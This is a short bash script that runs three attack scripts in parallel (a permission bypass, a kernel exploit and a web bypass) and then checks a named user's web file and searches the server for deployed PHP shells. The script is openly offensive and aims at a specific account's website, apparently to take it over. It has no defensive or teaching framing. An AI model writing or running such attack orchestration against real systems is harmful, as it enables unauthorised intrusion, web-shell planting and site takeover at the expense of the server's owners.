#!/bin/bash
echo "=== FINAL COMPREHENSIVE ATTACK ==="
echo "Running all bypass methods systematically..."
echo ""

# Run all attacks
./advanced_bypass.sh > /tmp/advanced.log 2>&1 &
./kernel_exploit.sh > /tmp/kernel.log 2>&1 &  
./web_bypass.sh > /tmp/web.log 2>&1 &

wait

echo ""
echo "=== ATTACK RESULTS ==="
echo "Advanced Bypass:"
tail -5 /tmp/advanced.log

echo ""
echo "Kernel Exploit:"
tail -5 /tmp/kernel.log

echo ""
echo "Web Bypass:"
tail -5 /tmp/web.log

echo ""
echo "=== CHECKING FOR SUCCESS ==="
TARGET_FILE="/home/keshavduac/public_html/Keshav/public/index.php"
echo "Final target permissions:"
ls -la "$TARGET_FILE"

echo ""
echo "Checking for deployed shells:"
find /home/keshavduac /tmp /var/tmp -name "*shell*" -name "*.php" 2>/dev/null | head -10

echo ""
echo "=== FINAL ATTACK COMPLETE ==="
echo "Logs available in /tmp/advanced.log, /tmp/kernel.log, /tmp/web.log"